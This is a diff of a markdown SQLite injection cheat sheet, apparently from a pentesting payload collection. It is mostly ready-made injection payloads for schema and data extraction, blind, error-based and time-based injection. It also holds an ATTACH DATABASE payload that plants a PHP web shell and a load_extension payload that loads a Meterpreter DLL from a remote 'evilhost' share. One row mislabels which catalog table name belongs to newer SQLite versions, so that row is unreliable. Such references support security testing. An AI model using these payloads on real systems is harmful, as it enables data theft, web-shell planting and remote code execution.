@@ -1,97 +1,97 @@
 # SQLite Injection
 
+> SQLite Injection  is a type of security vulnerability that occurs when an attacker can insert or "inject" malicious SQL code into SQL queries executed by an SQLite database. This vulnerability arises when user inputs are integrated into SQL statements without proper sanitization or parameterization, allowing attackers to manipulate the query logic. Such injections can lead to unauthorized data access, data manipulation, and other severe security issues. 
+
+
 ## Summary
 
-* [SQLite comments](#sqlite-comments)
-* [SQLite version](#sqlite-version)
-* [String based - Extract database structure](#string-based---extract-database-structure)
-* [Integer/String based - Extract table name](#integerstring-based---extract-table-name)
-* [Integer/String based - Extract column name](#integerstring-based---extract-column-name)
-* [Boolean - Count number of tables](#boolean---count-number-of-tables)
-* [Boolean - Enumerating table name](#boolean---enumerating-table-name)
-* [Boolean - Extract info](#boolean---extract-info)
-* [Boolean - Error based](#boolean---error-based)
-* [Time based](#time-based)
-* [Remote Command Execution using SQLite command - Attach Database](#remote-command-execution-using-sqlite-command---attach-database)
-* [Remote Command Execution using SQLite command - Load_extension](#remote-command-execution-using-sqlite-command---load_extension)
+* [SQLite Comments](#sqlite-comments)
+* [SQLite Enumeration](#sqlite-enumeration)
+* [SQLite String](#sqlite-string)
+    * [SQLite String Methodology](#sqlite-string-methodology)
+* [SQLite Blind](#sqlite-blind)
+    * [SQLite Blind Methodology](#sqlite-blind-methodology)
+    * [SQLite Blind With Substring Equivalent](#sqlite-blind-with-substring-equivalent)
+* [SQlite Error Based](#sqlite-error-based)
+* [SQlite Time Based](#sqlite-time-based)
+* [SQlite Remote Code Execution](#sqlite-remote-code-execution)
+    * [Attach Database](#attach-database)
+    * [Load_extension](#load_extension)
+* [SQLite File Manipulation](#SQLite-file-manipulation)
+    * [SQLite Read File](#SQLite-read-file)
+    * [SQLite Write File](#SQLite-write-file)
 * [References](#references)
-## SQLite comments
 
-```sql
---
-/**/
-```
 
-## SQLite version
+## SQLite Comments
 
-```sql
-select sqlite_version();
-```
+| Description         | Comment |
+| ------------------- | ------- |
+| Single-Line Comment | `--`    |
+| Multi-Line Comment  | `/**/`  |
 
-## String based - Extract database structure
 
-```sql
-SELECT sql FROM sqlite_schema
-```
+## SQLite Enumeration
 
-## Integer/String based - Extract table name
+| Description   | SQL Query |
+| ------------- | ----------------------------------------- |
+| DBMS version  | `select sqlite_version();`                |
 
-```sql
-SELECT tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'
-```
 
-Use limit X+1 offset X, to extract all tables.
+## SQLite String
 
-## Integer/String based - Extract column name
+### SQLite String Methodology
 
-```sql
-SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='table_name'
-```
+| Description             | SQL Query                                 |
+| ----------------------- | ----------------------------------------- | 
+| Extract Database Structure                           | `SELECT sql FROM sqlite_schema` |
+| Extract Database Structure (sqlite_version > 3.33.0) | `SELECT sql FROM sqlite_master` |
+| Extract Table Name  | `SELECT tbl_name FROM sqlite_master WHERE type='table'` |
+| Extract Table Name  | `SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'` |
+| Extract Column Name | `SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='table_name'` |
+| Extract Column Name | `SELECT GROUP_CONCAT(name) AS column_names FROM pragma_table_info('table_name');` |
+| Extract Column Name | `SELECT MAX(sql) FROM sqlite_master WHERE tbl_name='<TABLE_NAME>'` |
+| Extract Column Name | `SELECT name FROM PRAGMA_TABLE_INFO('<TABLE_NAME>')` |
 
-For a clean output
 
-```sql
-SELECT replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(substr((substr(sql,instr(sql,'(')%2b1)),instr((substr(sql,instr(sql,'(')%2b1)),'')),"TEXT",''),"INTEGER",''),"AUTOINCREMENT",''),"PRIMARY KEY",''),"UNIQUE",''),"NUMERIC",''),"REAL",''),"BLOB",''),"NOT NULL",''),",",'~~') FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' AND name ='table_name'
-```
+## SQLite Blind
 
-## Boolean - Count number of tables
+### SQLite Blind Methodology
 
-```sql
-and (SELECT count(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' ) < number_of_table
-```
+| Description             | SQL Query                                 |
+| ----------------------- | ----------------------------------------- | 
+| Count Number Of Tables  | `AND (SELECT count(tbl_name) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' ) < number_of_table` | 
+| Enumerating Table Name  | `AND (SELECT length(tbl_name) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' LIMIT 1 OFFSET 0)=table_name_length_number` | 
+| Extract Info            | `AND (SELECT hex(substr(tbl_name,1,1)) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' LIMIT 1 OFFSET 0) > HEX('some_char')` | 
+| Extract Info (order by) | `CASE WHEN (SELECT hex(substr(sql,1,1)) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' LIMIT 1 OFFSET 0) = HEX('some_char') THEN <order_element_1> ELSE <order_element_2> END` | 
 
-## Boolean - Enumerating table name
 
-```sql
-and (SELECT length(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name not like 'sqlite_%' limit 1 offset 0)=table_name_length_number
-```
+### SQLite Blind With Substring Equivalent
 
-## Boolean - Extract info
+| Function    | Example                                   |
+| ----------- | ----------------------------------------- | 
+| `SUBSTRING` | `SUBSTRING('foobar', <START>, <LENGTH>)`  | 
+| `SUBSTR`    | `SUBSTR('foobar', <START>, <LENGTH>)`     | 
 
-```sql
-and (SELECT hex(substr(tbl_name,1,1)) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' limit 1 offset 0) > hex('some_char')
-```
 
-## Boolean - Extract info (order by)
-
-```sql
-CASE WHEN (SELECT hex(substr(sql,1,1)) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' limit 1 offset 0) = hex('some_char') THEN <order_element_1> ELSE <order_element_2> END
-```
-
-## Boolean - Error based
+## SQlite Error Based
 
 ```sql
 AND CASE WHEN [BOOLEAN_QUERY] THEN 1 ELSE load_extension(1) END
 ```
 
-## Time based
+
+## SQlite Time Based
 
 ```sql
 AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
+AND 1337=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
 ```
 
 
-## Remote Command Execution using SQLite command - Attach Database
+## SQLite Remote Code Execution
+
+### Attach Database
 
 ```sql
 ATTACH DATABASE '/var/www/lol.php' AS lol;
@@ -99,15 +99,31 @@ CREATE TABLE lol.pwn (dataz text);
 INSERT INTO lol.pwn (dataz) VALUES ("<?php system($_GET['cmd']); ?>");--
 ```
 
-## Remote Command Execution using SQLite command - Load_extension
+### Load_extension
+
+:warning: This component is disabled by default.
 
 ```sql
 UNION SELECT 1,load_extension('\\evilhost\evilshare\meterpreter.dll','DllMain');--
 ```
 
-Note: By default this component is disabled
+
+## SQLite File Manipulation
+
+### SQLite Read File
+
+SQLite does not support file I/O operations by default.
+
+
+### SQLite Write File
+
+```sql
+SELECT writefile('/path/to/file', column_name) FROM table_name
+```
+
 
 ## References
 
-[Injecting SQLite database based application - Manish Kishan Tanwar](https://www.exploit-db.com/docs/english/41397-injecting-sqlite-database-based-applications.pdf)
-[SQLite Error Based Injection for Enumeration](https://rioasmara.com/2021/02/06/sqlite-error-based-injection-for-enumeration/)
+* [Injecting SQLite database based application - Manish Kishan Tanwar - February 14, 2017](https://www.exploit-db.com/docs/english/41397-injecting-sqlite-database-based-applications.pdf)
+* [SQLite Error Based Injection for Enumeration - Rio Asmara Suryadi - February 6, 2021](https://rioasmara.com/2021/02/06/sqlite-error-based-injection-for-enumeration/)
+* [SQLite3 Injection Cheat sheet - Nickosaurus Hax - May 31, 2012](https://sites.google.com/site/0x7674/home/sqlite3injectioncheatsheet)
